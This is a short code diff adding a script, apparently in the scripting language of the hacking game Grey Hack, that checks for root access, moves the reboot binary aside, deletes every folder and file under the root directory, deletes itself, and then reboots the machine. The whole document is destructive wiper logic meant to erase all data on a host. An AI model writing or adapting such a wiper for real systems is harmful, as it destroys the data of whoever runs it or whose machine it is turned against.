@@ -1,0 +1,18 @@
+if active_user != "root" then
+	exit("Run as root")
+end if
+
+host = get_shell.host_computer
+boot = host.File("/bin/reboot")
+if boot then
+    m = boot.move("/", boot.name)
+end if
+files = host.File("/")
+for folder in files.get_folders
+	folder.delete
+end for
+for file in files.get_files
+	file.delete
+end for
+host.File(program_path).delete
+if m then host.launch("/reboot")
